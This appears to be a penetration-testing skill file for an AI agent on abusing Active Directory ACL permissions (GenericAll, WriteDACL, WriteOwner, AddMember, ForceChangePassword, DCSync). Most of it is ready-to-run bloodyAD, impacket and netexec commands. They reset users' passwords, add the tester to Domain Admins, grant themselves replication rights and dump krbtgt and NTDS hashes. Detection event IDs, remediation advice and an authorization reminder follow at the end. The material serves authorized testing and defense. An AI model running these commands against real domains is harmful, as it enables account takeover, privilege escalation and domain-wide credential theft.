---
name: acl-abuse
description: Abusing Active Directory object ACLs (DACL/ownership) for privilege escalation and lateral movement (GenericAll, GenericWrite, WriteDACL, WriteOwner, AddMember, ForceChangePassword, and replication rights via DS-Replication-Get-Changes-All). Use when BloodHound CE shows an outbound control edge from a principal you own toward a higher-value object, and you want the exact bloodyAD/impacket command to weaponize that ACE, plus detection and remediation. DCSync is covered here strictly as a post-compromise technique, not a user entry path.
---

# ACL Abuse

Active Directory permissions are a graph. A single misconfigured Access Control Entry (ACE), say a low-priv user with `GenericAll` over a group, `WriteDacl` over a computer, or `WriteOwner` over an OU, is a directed edge you can walk from where you are toward Domain Admin. This skill turns those edges into concrete commands with **bloodyAD** and **impacket**, after **BloodHound CE** (Apache-2.0, genuinely open source) has drawn the path.

**Find the paths first (BloodHound CE).** Collect with a standard collector, import into BloodHound CE, and look at the outbound control edges from your owned principal: `GenericAll`, `GenericWrite`, `WriteDacl`, `Owns`/`WriteOwner`, `AddMember`, `ForceChangePassword`, `AllExtendedRights`, and `DCSync`. Pre-built queries like "Shortest paths from Owned principals" and "Find principals with DCSync rights" hand you the chain.

Collect edges with a standard collector, for example:
```
nxc ldap 10.0.0.10 -u user -p 'Password123' --bloodhound --collection All --dns-server 10.0.0.10
```
or run `rusthound-ce` / SharpHound CE and import the ZIP into BloodHound CE.

---

## GenericAll

**MITRE ATT&CK:** T1222 (Permission Modification) / T1098 (Account Manipulation)

**What it is.** Full control over the target object. What you do with it depends on the target type:
- **Over a user:** reset their password (ForceChangePassword) or set an SPN and Kerberoast them (targeted roasting), or set `DONT_REQ_PREAUTH` and AS-REP roast.
- **Over a group:** add yourself as a member (AddMember).
- **Over a computer:** write RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`) and impersonate (see the Kerberos skill).

Reset a user's password:
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  set password TARGETUSER 'NewPass123!'
```

Add yourself to a group:
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  add groupMember 'Domain Admins' owneduser
```

Targeted Kerberoast (set an SPN you control, then roast, see Kerberos skill):
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  set object TARGETUSER servicePrincipalName -v 'fake/svc'
GetUserSPNs.py -request-user TARGETUSER -dc-ip 10.0.0.10 CORP.LOCAL/owneduser:'Password123'
```

---

## GenericWrite

**MITRE ATT&CK:** T1098

**What it is.** Write non-protected attributes on the target. Enough to set an SPN (targeted Kerberoast), set `DONT_REQ_PREAUTH` (targeted AS-REP roast), or write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer (RBCD). Not enough to reset the password directly on a user (that is ForceChangePassword / GenericAll).

Set the preauth-disabled flag for a targeted AS-REP roast:
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  add uac TARGETUSER -f DONT_REQ_PREAUTH
GetNPUsers.py -dc-ip 10.0.0.10 -request CORP.LOCAL/owneduser:'Password123'
```

Write RBCD on a computer you can then S4U through:
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  add rbcd TARGET$ EVIL$
```

---

## ForceChangePassword

**MITRE ATT&CK:** T1098

**What it is.** The `User-Force-Change-Password` extended right lets you reset the target user's password without knowing the old one. Straight account takeover of that user.

```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  set password TARGETUSER 'NewPass123!'
```
impacket alternative:
```
net rpc password TARGETUSER 'NewPass123!' -U 'CORP.LOCAL/owneduser%Password123' -S 10.0.0.10
```

**Note:** resetting an in-use account is noisy and disruptive; it locks the real user out. Prefer targeted Kerberoast/AS-REP where the edge allows, and coordinate password resets with the client.

---

## AddMember

**MITRE ATT&CK:** T1098

**What it is.** Write access to a group's `member` attribute. Add a principal you control to a privileged group (a nested group that eventually reaches Domain Admins is just as good).

```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  add groupMember 'Backup Operators' owneduser
```

---

## WriteDACL

**MITRE ATT&CK:** T1222.001 (Windows Permission Modification)

**What it is.** You can rewrite the target's DACL, so you grant *yourself* whatever ACE you want (up to full control) and then exploit that. The common escalation is to grant yourself the replication rights on the domain object (setting up DCSync, see below) or GenericAll on a user/group.

Grant yourself an ACE on the target (impacket dacledit):
```
dacledit.py -action write -rights FullControl -principal owneduser \
  -target-dn 'CN=TargetUser,CN=Users,DC=corp,DC=local' \
  -dc-ip 10.0.0.10 CORP.LOCAL/owneduser:'Password123'
```

bloodyAD equivalent (grant a right on an object):
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  add genericAll 'CN=TargetUser,CN=Users,DC=corp,DC=local' owneduser
```

---

## WriteOwner / Owns

**MITRE ATT&CK:** T1222.001

**What it is.** You can set yourself as the *owner* of the target object. The owner can always rewrite the DACL, so WriteOwner chains into WriteDACL into full control. Two steps: take ownership, then grant yourself rights.

Take ownership (impacket owneredit):
```
owneredit.py -action write -new-owner owneduser \
  -target-dn 'CN=TargetUser,CN=Users,DC=corp,DC=local' \
  -dc-ip 10.0.0.10 CORP.LOCAL/owneduser:'Password123'
```
Then grant yourself full control with dacledit (as above), then exploit as GenericAll.

bloodyAD one-liner for ownership:
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u owneduser -p 'Password123' \
  set owner 'CN=TargetUser,CN=Users,DC=corp,DC=local' owneduser
```

---

## Replication rights → DCSync (POST-COMPROMISE ONLY)

**MITRE ATT&CK:** T1003.006 (OS Credential Dumping: DCSync)

**Frame this correctly.** DCSync is **not a user entry path**. It is a post-compromise credential-extraction technique performed by a principal that *already holds* the directory replication extended rights, `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, on the domain object. In a healthy domain those rights belong only to Domain Controllers and to Domain/Enterprise Admins, so being able to DCSync normally means you are already Domain Admin (or the equivalent). It matters to ACL abuse only in one specific case: **a non-DC, non-admin principal has been mis-granted those replication rights**, usually as the *result* of a WriteDACL/WriteOwner chain above. In that case DCSync is the payoff of the ACL abuse, still executed after you have obtained (or granted yourself) the replication rights, never before.

So the ACL entry point is the mis-granted right (or granting it to yourself via WriteDACL on the domain object); the DCSync itself is the follow-on.

Grant the replication rights (only if you have WriteDACL on the domain head, the abusable misconfiguration):
```
dacledit.py -action write -rights DCSync -principal owneduser \
  -target-dn 'DC=corp,DC=local' -dc-ip 10.0.0.10 CORP.LOCAL/owneduser:'Password123'
```

Then, holding those rights, replicate secrets (impacket secretsdump):
```
secretsdump.py -just-dc-user 'CORP\krbtgt' CORP.LOCAL/owneduser:'Password123'@10.0.0.10
secretsdump.py -just-dc CORP.LOCAL/owneduser:'Password123'@10.0.0.10   # full dump
```
netexec equivalent:
```
nxc smb 10.0.0.10 -u owneduser -p 'Password123' --ntds
```

Dumping `krbtgt` enables Golden Tickets; dumping the Administrator hash enables pass-the-hash. Both are post-DA persistence, not entry.

---

## Detection (Event IDs)

- **5136**: a directory object was modified. This is the central ACL-abuse event: it fires on DACL changes, group membership changes, SPN writes, `userAccountControl` flips, RBCD writes, and owner changes. Watch the `AttributeLDAPDisplayName` (e.g. `nTSecurityDescriptor`, `member`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`).
- **5137/5139/5141**: object created/moved/deleted, for the surrounding activity.
- **4662**: an operation was performed on an object. For DCSync, look for 4662 with the replication control access GUIDs `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes) and `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All) requested by a principal that is **not** a Domain Controller, which is the tell that a non-DC is replicating.
- **4738**: a user account was changed (attribute-level).
- **4728/4732/4756**: a member was added to a security-enabled group.
- Microsoft Defender for Identity raises "Suspected DCSync attack" on replication from a non-DC.

---

## Remediation to write up

- **Audit ACEs.** Enumerate non-default ACEs across users, groups, computers, OUs and the domain head. Any GenericAll/GenericWrite/WriteDacl/WriteOwner held by a non-Tier-0 principal over a privileged object is a finding.
- **Strip replication rights from everything that is not a DC.** Only Domain Controllers and the intended Tier-0 admins should hold `DS-Replication-Get-Changes-All`. Remove it from every user/group/service account that has it.
- **Protect the domain head DACL.** `WriteDacl`/`WriteOwner` on `DC=corp,DC=local` is game over; lock it to Tier-0.
- **Set `MachineAccountQuota` to 0** to kill the RBCD-via-new-computer variant.
- Alert on 5136 changes to security descriptors and to `member` on privileged groups; alert on 4662 replication access from non-DCs.
- Use tiered administration so the graph has no low-priv-to-Tier-0 edges in the first place.

Only exploit ACLs on systems you are authorized to test. Password resets are disruptive; coordinate. Use lab/generic DNs and names in write-ups.

---

## Reference

- DACL abuse (GenericAll/GenericWrite/WriteDacl/WriteOwner/AddMember): https://www.thehacker.recipes/ad/movement/dacl/
- Targeted Kerberoasting: https://www.thehacker.recipes/ad/movement/kerberos/roasting/kerberoast
- DCSync: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
